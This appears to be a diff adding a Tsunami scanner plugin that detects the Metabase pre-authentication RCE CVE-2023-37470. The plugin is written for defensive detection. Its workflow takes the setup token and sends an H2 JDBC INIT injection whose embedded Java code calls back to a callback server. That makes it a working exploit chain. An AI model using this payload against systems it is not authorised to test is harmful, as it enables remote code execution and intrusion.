@@ -1,0 +1,126 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Metabase_CVE_2023_37470"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the templated engine version, "
+    "secureness for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE-2023-37470"
+  }
+  severity: CRITICAL
+  title: "Metabase Pre-Authentication RCE (CVE-2023-37470)"
+  description: 
+    "Metabase open source before 0.46.6.4 and Metabase Enterprise before 1.46.6.4"
+    " has a vulnerability that allows attackers to execute arbitrary commands"
+    " on the server, at the server's privilege level. Authentication is not"
+    " required for exploitation. This plugin detects CVE-2023-37470, which "
+    " is a bypass for fixes for CVE-2023-38646. "
+  recommendation: 
+    "Please upgrade Metabase to patched versions: v0.46.6.4, v1.46.6.4, v0.45.4.3,"
+    " v1.45.4.3, v0.44.7.3, v1.44.7.3, v0.43.7.3 or v1.43.7.3."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-37470"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_metabase"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "<title>Metabase</title>" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "get_setup_token"
+  http_request: {
+    method: GET
+    uri: "/api/session/properties"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "setup-token" }
+        ]
+      },
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"setup-token\":\"([^\"]+)\""
+            variable_name: "SETUP_TOKEN"
+          }
+        ]
+      }
+    }
+  }
+}
+
+# uses openStream instead of executing a command to reduce false negatives
+
+actions: {
+  name: "trigger_callback"
+  http_request: {
+    method: POST
+    uri: "/api/setup/validate"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data:
+      "{\"details\": {\"details\": {\"advanced-options\": true, \"classname\": \"org.h2.Driver\","
+      " \"subname\": \"mem:\\\\;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS CALLBACK AS $$ void"
+      " callback() throws java.io.IOException {new java.net.URL(\\\"{{ T_CBS_URI }}\\\").openStream()\\\\;} $$\\\\;CALL CALLBACK();\","
+      " \"subprotocol\": \"h2\"}, \"engine\": \"postgres\", \"name\": \"x\"}, \"token\":"
+      " \"{{ SETUP_TOKEN }}\"}"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 4000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_metabase",
+    "get_setup_token",
+    "trigger_callback",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
